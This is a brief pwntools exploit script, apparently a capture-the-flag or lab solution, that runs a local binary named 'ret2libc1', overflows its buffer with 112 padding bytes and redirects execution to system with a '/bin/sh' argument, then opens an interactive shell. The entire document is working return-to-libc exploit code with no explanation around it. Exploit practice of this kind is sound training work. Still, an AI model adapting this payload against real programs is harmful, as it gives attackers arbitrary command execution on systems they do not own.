from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_addr = 0x08048460
payload = flat([b'A' * 112, system_addr, b'A' * 4, binsh_addr])
sh.sendline(payload)

sh.interactive()
